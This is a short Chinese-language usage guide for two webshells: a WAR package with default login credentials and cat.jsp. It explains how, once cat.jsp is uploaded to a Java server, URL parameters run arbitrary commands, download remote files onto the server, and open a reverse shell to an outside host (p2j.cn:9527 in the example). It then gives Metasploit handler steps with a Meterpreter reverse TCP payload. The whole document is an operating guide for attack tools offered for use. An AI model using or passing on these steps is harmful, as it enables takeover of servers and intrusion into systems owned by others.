oneWordWebShell.war   是针对上传一个war的情况下的。打开之后  
登录名 voilet   密码：admin， 就是一个文本shell的后台管理

cat.jsp   是一个集成的webshell。首先上传本jsp文件：以下三个利用方法
1、action=exec ，cmd=？  执行命令
http://localhost:8080/Struts2/cat.jsp?action=exec&cmd=ifconfig  
------------------------------------------------------------------------------------------------------------------------------------------------
2、action=downloadL
      url=需要下载的文件的URL地址、
      path=文件保存的绝对路径，注意如果只写文件名会下载到当前运行环境的目录下(比如tomcat会下载到tomcat的bin目录)。

请求：http://localhost:8080/Struts2/cat.jsp?action=downloadL&url=http://www.baidu.com/img/bdlogo.png&path=bdlogo.png  
------------------------------------------------------------------------------------------------------------------------------------------------
3、 action=shell
       host=远程IP
       port=远程监听的端口
http://localhost:8080/Struts2/cat.jsp?action=shell&host=p2j.cn&port=9527
用法：首先在msf中 
1、使用 exploit/multi/handler 模块 
2、使用    linux/x86/meterpreter_reverse_tcp 这个payload。 将lhost 设置为kali的 地址
3、第三步才是去 访问上面的地址，host=kali的地址，端口自己设置